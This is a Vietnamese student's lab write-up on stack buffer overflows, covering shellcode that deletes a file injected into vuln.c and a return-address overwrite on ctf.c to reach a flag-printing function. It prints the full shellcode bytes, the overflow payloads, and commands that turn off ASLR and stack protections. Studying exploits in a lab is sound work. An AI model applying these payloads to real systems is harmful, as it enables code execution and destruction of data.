# Lab 2

Cài đặt docker: [Docker_Desktop](https://www.docker.com/products/docker-desktop/) \
Cài đặt môi trường Ubuntu 32-bit by [quang-ute](https://github.com/quang-ute): [quang-ute/my-project](https://github.com/quang-ute/myprojects) \
Gói tài liệu bufferoverflow by [quang-ute](https://github.com/quang-ute): [quang-ute/security-lab/buffer-overflow](https://github.com/quang-ute/Security-labs/tree/main/Software/buffer-overflow) \
Chạy docker với môi trường ảo đã cài đặt trên: `docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab`

## Inject code to delete file: file_del.asm is given on github

### Ý tưởng

1. Từ file_del.asm biên dịch thành file_del.o để chuyển thành chương trình file_del (thực thi được - executable file)
2. Chuyển đổi file_del thành opcode để chèn vào trong chương trình đối tượng: vuln.c
3. Quan sát cấu trúc stack của chương trình đối tượng vuln.c\
![target](/Week%202/img/1_target.png)
   - Chương trình khai báo biến buf **tận 64 byte**, đủ lớn để chèn vào trong đó **một chương trình nhỏ**. Chương trình được chèn vào được chọn là chương trình được viết bằng *asm* thay vì *c* để giảm thiểu kích cỡ của chương trình hết mức.\
   - Chương trình vuln.c sử dụng strcpy để lấy dữ liệu là phương thức để truyền các dữ liệu vào.
4. Phân tích stack của chương trình đối tượng:
![stack](/Week%202/img/1_stack.png)
   - Cả stack của hàm main có kích cỡ là 80 bytes (B)
   - Mục đich là chèn chương trình có *x bytes* | x <= 64(chưa xác định) vào trong *biến buf* rồi sau đó tạo stack overflow để ghi đè địa chỉ trả về (return address) để trỏ về con trỏ esp để chạy chương trình đã được chèn hiện đang lưu trữ trên cùng của stack.
   - Vì chưa xác định được kích cỡ của chương trình chèn vào nên đặt x, buf có 64B nên phần còn lại sẽ được chèn ký tự a (có thể thay bằng ký tự khác tuỳ ý) với kích cỡ là 1 ký tự tương đương 1B. Nghĩa là cần chèn vào 64 - x ký tự a.
![stack2](/Week%202/img/1_stack2.png)
5. Biên dịch chương trình vuln.c thành vuln.out
6. Chèn opcode vào trong biến local của đối tượng để gây ra stack overflow từ đó chiếm quyền của chương trình và thực thi chương trình được chèn vào

## Chuẩn bị môi trường

1. Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên để tiện cho việc quan sát (hoặc có lỗi gây ra sẽ dễ fix hơn)\
`sudo sysctl -w kernel.randomize_va_space=0`
1. Biên dịch chương trình đối tượng bằng gcc cùng với các options:\
`gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`
   - `-fno-stack-protector` để tắt chế độ bảo vệ chèn dữ liệu ra ngoài stack (stack overflow)
   - `-z execstack` để cho phép thực thi chương trình được chạy trên stack
   - `-mpreferred-stack-boundary=2` để khi biên dịch chương trình nhìn đẹp mắt hơn (maybe)
1. Tạo đường dẫn tới zsh thay vì sh (default) để tắt khả năng chống chương trình chạy tự động\
`sudo ln -sf /bin/zsh /bin/sh`

## Thực hiện

1. Biên dịch chương trình mã máy file_del.asm thành file_del.o\
`nasm -g -f elf file_del.asm`\
![nasm](/Week%202/img/1_nasm.png)
1. Biên dịch chương trình file_del.out thành file_del để thực thi\
`ld -m elf_i386 -o file_del file_del.o`\
![ld](/Week%202/img/1_ld.png)
1. Disassemble chương trình file_del thể quan sát opcode và hợp ngữ của nó\
`objdump -d file_del`\
![objdump](/Week%202/img/1_objdump.png)
1. Quan sát opcode của chương trình file_del chúng ta có thể thấy nó xuất hiện nhiều giá trị như `00` và cả `0a`, đây là 2 giá trị sẽ làm chương trình dừng lại nên chúng ta cần xử lý nó.\
Note: Riêng giá trị `00` ở cuối chương trình không ảnh hưởng nên có thể loại bỏ hoặc không (vì dù gì đến đó chương trình cũng đã kết thúc)\
![warning](/Week%202/img/1_warning.png)
1. Chỉnh sửa mã nguồn của file_del.asm:
   - Thay đổi `mov eax, 10` thành `mov al 8` và `add al 2`\
   Mục đích là vì thanh ghi **eax** có tận **32 bits value** quá lớn để lưu trữ giá trị 10 nên sẽ sinh ra nhiều giá trị `00` nên chuyển sang sử dụng thanh ghi **al** có **8 bits value** sẽ tránh việc tạo ra nhiều giá trị `00` cũng có nghĩa là **null**
   Cùng với việc thay đổi từ lưu giá trị 10 thành lưu giá trị 8 rồi cộng thêm 2 để tránh tạo ra giá trị `0a`
   - Thay đổi `mov eax, 1` thành `mov al, 1` nhằm mục đích **hạn chế giá trị null như trên**\
![edited](/Week%202/img/1_edited.png)\
Sau đó biên dịch lại chương trình *file_del.nasm* tương tự như các [bước 2,3,4](#thực-hiện)
Kết quả sẽ như sau\
![after](/Week%202/img/1_after.png)
1. Chuyển đổi chương trình trên thành **opcode** để chuẩn bị cho bước chèn\
`for i in $(objdump -d file_del | grep "^ " | cut -f2);do echo -n '\x'$i; done; echo`\
![opcode](/Week%202/img/1_opcode.png)\
Lưu lại opcode ở đâu đó để sử dụng cho các bước sau. Và **nhớ loại bỏ phần `\xdummyfile.`** vì nó đã bị lặp lại ở trước đó và không tồn tại giá trị ký tự dài như vậy.

`\xeb\x0f\xb0\x08\x04\x02\xbb\x76\x80\x04\x08\xcd\x80\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00`
> Opcode trên có kích thước bằng với số lượng `\x` mà nó có **không bao gồm \x00**. Nghĩa là opcode trên có kích thước là *31*

1. Debug chương trình đối tượng:\
`gdb -q ./vuln.out`\
(P/s: -q Quite: không bla bla, chạy thẳng vào chương trình debug. Demo below:)
![gdb -q](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeXJpxmMkO7CRmG2ujlw3q0bl5-C-7-bCeAthpYy647vSoBalh7vMqYkyfDH1iz8y3EFUQ-I2HYueWc_53A1InFdnDeEU7HNqPtC1ZJN72BEag9tTJpaY6PUOdHOyxmD7HaMPpAEQ_ICIjzM2GYHbNYDXsZ?key=x066aHYoH5XtbJjV6Ng-LQ)
1. Disassemble hàm main để đặt breakpoint trước và sau khi chạy lệnh strcpy\
`disas main`\
![breakpoints](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcYlxdWE4UVH6SedLu89DPs-GroaWUuopIngFKqj0xDvsqaJ5m7DUXKRU0aT_1hVyLleCjuIPGfmwqn_4n3rM2aylOIuOXSf73LZuCpnYqVd7cGBYWigW50V8G7TnBijlhRfeJf4wlMrd_ca49oMZsnp84?key=x066aHYoH5XtbJjV6Ng-LQ)

Đặt 2 breakpoint tại điểm 1 và 2.

- Lý do:

  - Sau khi chương trình đã hoàn thành khởi tạo stack: push ebp vào stack, lưu esp = ebp, push biến khởi tạo (char buf[64]) vào trong stack (0x40 là 64 byte ở dạng thập lục)
  - Sau khi hoàn thành lệnh *strcpy* và đã giải phóng ebp và trở về return address **ra**
- Bằng lệnh:\
`b *0x08048441` và `b *0x0804846b`\
![stack_image](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfcFhn-XfQInCLengUwgWvn42hxTJqOEC39tR0Sn7WeenzLjGysWKm_F7p4FaKFBzgIX0UpohnEeUON8ngGr6n-aH2yZ6bGpz66D9Dv394yZRAn6HS1msc8Iwzyy2cNcX6io7an5Jdu2MEB1SiFhgsjptf9?key=x066aHYoH5XtbJjV6Ng-LQ)

Extra: Kiểm tra breakpoint bằng `info breakpoint` và xoá breakpoint bằng lệnh `del [số thứ tự của breakpoint]`

1. Chạy debug chương trình vuln.out với giá trị đầu vào của argv[]\
![stack3](/Week%202/img/1_stack3.png)

Cú pháp để chạy chương trình với dữ liệu đầu vào gây ra *stack overflow*
> r $(python -c "print('[opcode]' + 'a' * [64 - sizeof(opcode) + 4] + '\xff\xff\xff\xff')")

Cú pháp của bài hiện tại sẽ là:\
`r $(python -c "print('\xeb\x0f\xb0\x08\x04\x02\xbb\x76\x80\x04\x08\xcd\x80\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65' + 'a' * 37 + '\xff\xff\xff\xff')")`\
![gdb1](/Week%202/img/1_gdb1.png)\
Chương trình sẽ dừng lại breakpoint 1.\
Dùng lệnh xuất ra 80B từ con trỏ esp để xem toàn cảnh stack\
`x/80xb $esp`\
![breakpoint1](/Week%202/img/1_breakpoint1.png)\
10. Dùng lệnh continue để lệnh strcpy được thực thi\
`continue`\
![gdb2](/Week%202/img/1_gdb2.png)\
tiếp tục kiểm tra stack sau khi lệnh strcpy đã thực thi\
![breakpoint2](/Week%202/img/1_breakpoint2.png)\
Nhưng chúng ta thấy, mọi thứ đề đã hoạt động đúng như dự kiến. Chương trình đã được chèn vào trong buf và đã xảy rả stack overflow khiến **ra** đa bị ghi đè thành `\xff\xff\xff\xff`.\
10. Chuyển **ra** thành địa chỉ của con trỏ $esp\
Bằng cách xác định vị trí của **ra** chúng ta có thể thay đổi giá trị của nó để trỏ về con trỏ **esp**\
`set *0xffffd70c = $esp`\
![gdb step1](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdgt0gu7mi96W3WmpgToksMKLSphIEGoa6cRSIAsDUbp9pdOLapRxoZ_izqcJcED58sg5i6PQzZ6OZ8_9D1JO-Rd9JQVpqNq3hx3qrVIYivFzsfPux9ExR5c66cj_g4o9PKpPQT6aC0dDj-CIn0pcZPpeg?key=x066aHYoH5XtbJjV6Ng-LQ)

11. Tiếp tục dùng lệnh `step` để xem từng bước kế tiếp để kiểm tra chương trình được chèn vào có thực thi không.\
![step1](/Week%202/img/1_step1.png)\
Từ đây chương trình main sẽ kết thúc và thực thi lệnh leave\
Step kế tiếp:\
![step2](/Week%202/img/1_step2.png)\
Chương trình đã chạy đến vị trí của con trỏ esp và trở lại trên đầu của stack cũng có nghĩa là stack overflow đã diễn ra.

[--- Return to the title ---](#lab-2)

## Conduct attack on ctf.c

Truy cập được vào hàm **myfunc** và chạy được đến đoạn `printf("You got the flag\n");`

Tham khảo gợi ý từ: [nguyendangquang_giải bài tập ctf](https://youtu.be/7Aa_AmQ_NlM?si=UvLiGh09sdwbKKEY)

### Ý tưởng

1. Quan sát cấu trúc stack của chương trình đối tượng ctf.c
![ctf.c](/Week%202/img/2_ctf.c.png)\
Hàm vuln khai bái biến buf[100] nhưng lại sử dụng strcpy để sao chép giá trị. Nghĩa là từ điểm này có thể tấn công vào để tạo ra được buffer overflow để chạy hàm **myfunc** được.

2. Hàm **myfunc** có 2 giá trị khởi tạo là *int p* và *int q*, nghĩa là trước khi truyền vào địa chỉ của hàm myfunc cần phải tạo ra 2 giá trị cho p và q trước để chương trình hoạt động bình thường (?)

3. Sau khi chạy được **myfunc** thì chướng ngại vật đầu tiên là chương trình sẽ mở file *flag1.txt* ở dạng *readonly* sau đó so sánh nội dung có trong file nếu là **NULL** thì sẽ dừng chương trình bằng lệnh *exit(0)* .Tuy nhiên file này không hề tồn tại trong thư mục lưu chương trình.
   > Chúng ta cần khiến cho chương trình lưu được một giá trị nào đó để khi so sánh với NULL thì sẽ vượt qua được!

4. Chương ngại vật thứ 2 mà chương khi đặt ra là **so sánh biến p với giá trị 0x04081211** nếu khác thì sẽ dừng chương trình lại bằng lệnh *return*.\
Chúng ta cần đều chỉnh cho biến p ở giá trị đầu vào sao cho **đúng với giá trị 0x04081211** thì sẽ không bị dừng lại.

5. Vật cản cuối *tương đồng* với chướng ngại vật bên trên nhưng lần này **biến là q** và **giá trị là 0x44644262**. Vậy nên cách thực hiện cũng tương đương với cách ở bên trên.

> Tổng quan lại về phần ý tưởng:
> ![stategy](/Week%202/img/2_strategy.png)

Sau khi hoàn thành các ý tưởng trên thì sẽ đạt được đích cuối là lấy được cờ!

### Chuẩn bị môi trường

1. Thực hiện lại bước 1 tương tự với cách thực hiện ở [bước 1 bài trên](#chuẩn-bị-môi-trường).

2. Biên dịch chương trình đối tượng bằng gcc cùng với các options:
gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack các chú thích đã được giải thích ở bước [chuẩn bị môi trường](#chuẩn-bị-môi-trường) ở trên.

### Thực hiện

1. Vào gdb để debug chương trình đối tượng:\
`gdb -q ./ctf.out`\
![2_gdb](/Week%202/img/2_gdb.png)

2. Quan sát stack của chương trình\
![2_stack](/Week%202/img/2_stack.png)\
Có thể thấy rằng stack trên có một vị trí rất thuận lợi để tấn công làm hàm vuln và sử dụng lệnh strcpy để nạp dữ liệu. Chúng ta sẽ chèn vào vị trí **ra** là địa chỉ của hàm myfunc.

3. Rã hàm vuln để đặt các breakpoint tiện cho việc quan sát chương trình.\
`disas vuln`\
![2_disas_main](/Week%202/img/2_disas_vuln.png)\
Đặt breakpoint tại các điểm:
   1. Tại trước thời điểm chạy lệnh strcpy và đã thực hiện tạo ra stack của hàm vuln.
   2. Tại sau thời điểm chạy lệnh strcpy để kiểm tra stack đã thay đổi như nào.\
`b *0x080485b3`\
![2_breakpoint_1](/Week%202/img/2_breakpoint_1.png)\
`b *0x080485c5`\
![2_breakpoint_2](/Week%202/img/2_breakpoint_2.png)

4. Tìm địa chỉ của hàm myfunc bằng 2 cách:
    1. Sử dụng gdb:\
    `p myfunc`\
    ![pmyfunc](/Week%202/img/2_pmyfunc.png)
    2. Không sử dụng gdb:\
    `objdump -d ./ctf.out` để rã chương trình ctf.out từ đó chúng ta tìm được địa chỉ của hàm myfunc giống như sau:\
    ![objdump](/Week%202/img/2_objdump.png)

5. Trước khi thực hiện chèn p vào thì chúng ta cần chèn cả giá trị của p và q để khi hàm myfunc được gọi sẽ có giá trị p và q như ý muốn.\
Có thể thấy rằng p và q tại cuối chương trình sẽ được kiểm tra bởi 2 dòng:\
![p&q](/Week%202/img/2_p&q.png)\
Nếu giá trị **p khác 0x04081211 và q khác 0x44644262** thì chương trình sẽ dừng dại bởi lệnh *return*.\
Nghĩa là chúng ta cần chèn p và q với **giá trị đầu vào bằng đúng những gì yêu cầu**.

6. Để khi chương hàm myfunc kết thúc không sinh ra lỗi thì chúng ta cần **chèn hàm exit** vào trong địa chỉ **ra** của stack myfunc.\
Trước hết cần phải xác định địa chỉ của hàm exit:
   1. Dùng lệnh `p exit` để xuất ra địa chỉ của hàm exit.\
   ![2_exit2](/Week%202/img/2_exit2.png)
   2. Hàm exit tồn tại trong phần **objdump -d ./ctf.out** đã được dùng ở trên:\
   ![2_exit1](/Week%202/img/2_exit1.png)

7. Chạy debug chương trình:

   > Giá trị khởi tạo của argv bằng công thức sau:\
   > r $(python -c "print('a' * 104 + [myfunc] + [exit()] + [p] + [q])")\
   > ![2_stack2](/Week%202/img/2_stack2.png)

   Sau khi thay vào các giá trị đã tìm ra ở trên:\
   `r $(python -c "print('a' * 104 + '\x1b\x85\x04\x08' + '\xe0\x83\x04\x08' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`\
   ![2_stack3](/Week%202/img/2_stack3.png)\
   Sau khi hoàn thành chương trình sẽ tạm dừng tại breakpoint 1:\
   ![2_run](/Week%202/img/2_run.png)

8. Kiểm tra stack của chương trình tại breakpoint 1:\
![2_stacksize](/Week%202/img/2_stacksize.png)\
Stack có kích thương tổng là 128 bytes từ vị trí con trỏ esp:\
`x/128xb $esp`\
![x128b_1](/Week%202/img/2_x128xb_1.png)

9. `continue` để chương trình thực hiện lệnh strcpy rồi sau đó lại sử dụng `x/128xb $esp` để quan sát sự thay đổi của stack.\
![x128xb_2](/Week%202/img/2_x128xb_2.png)

10. Tạo thêm breakpoint để dừng chương trình khi chạy hàm myfunc vì chúng ta chưa setup để vượt qua tất cả các chướng ngại vật.\
`disas myfunc`\
![disas myfunc](/Week%202/img/2_disas_myfunc.png)\
Rã hàm myfunc để đặt các breakpoint:
    1. `b *0x08048536` tại trước thời điểm **if (f == NULL)**\
    ![2_breakpoint_3](/Week%202/img/2_breakpoint_3.png)
    2. `b *0x0804856e` tại trước thơi điểm **if (p!=0x04081211)**\
    ![2_breakpoint_4](/Week%202/img/2_breakpoint_4.png)
    3. `b *0x08048586` tại trước thời điểm **if (q!=0x44644262)**\
    ![2_breakpoint_5](/Week%202/img/2_breakpoint_5.png)

11. `continue` để tiếp tục chương trình đến breakpoint kế tiếp.\
Stack của chương trình sau khi thực thi gọi hàm myfunc:\
![2_stack4](/Week%202/img/2_stack4.png)

12. Tại breakpoint thứ 3, hàm sẽ nạp nội dung của file 'flag1.txt' vào rồi so sánh nội dung của nó với null. Nếu là null thì sẽ dừng lại chương trình.\
Tuy nhiên tại đây thì từ [github của folder buffer_overflow](https://github.com/quang-ute/Security-labs/tree/main/Software/buffer-overflow) lại không có chưa file flag1.txt nên sẽ chia ra làm 2 hướng giải quyết:\
![github](/Week%202/img/2_github.png)
    1. Tự tạo ra 1 file flag1.txt trong thư mục buffer overflow rồi dùng notepad để ghi nội dung lên nó. Từ đó file flag1.txt khi được đọc sẽ pass.
    2. Thay đổi địa chỉ của **địa chỉ được đọc** để đổi hướng cho chương trình đọc nội dung từ nơi khác trong đó có tồn tại nội dung từ đó ẽ pass được.
    > Cá nhân em sẽ sử dụng cách 2 vì nó không can thiệp vào hệ thống folder của máy khi truy cập vào. Không cần dùng khả năng của user để có quyền tạo ra file rồi ghi nội dung lên nó.
     
     Thực hiện như sau:\
     Stack của chương trình khi này sẽ có kích thước là 92 byte nên từ đó dùng lệnh `x/92xb $esp` để xuất ra 92 byte kể từ vị trí của con trỏ esp.\
     ![readdata](/Week%202/img/2_readdata.png)\
     Theo như kết quả thì địa chỉ được nạp vào là rỗng nên chúng ta cần thay đổi giá trị này sang nơi khác có dữ liệu.\
     `set *0xffffd6cc = 0xffffd774`\
     Để thay đổi giắ trị được đọc từ null thành giá trị của **argv** từ đó sẽ truy cập được data arg[] sẽ không còn rỗng nữa.

13. `continue` để sang breakpoint kế tiếp, nếu không có lệnh stop thì mọi thứ đều đã hoạt động đúng như dự tính.\
Dữ liệu cho p tại vị trí [ebp+0x8] đã được thiết lập từ trước nên xem như đã vượt qua.\
![cont](/Week%202/img/2_cont.png)

14. tiếp tục `continue` để đến với breakpoint cuối cùng và tại đây chúng ta cũng không cần làm gì vì đã set giá trị từ đầu.\
![cont](/Week%202/img/2_cont2.png)

15. Một lần nữa `continue` và chúng ta đã hoàn thành được bài lab.\
![done](/Week%202/img/2_done.png)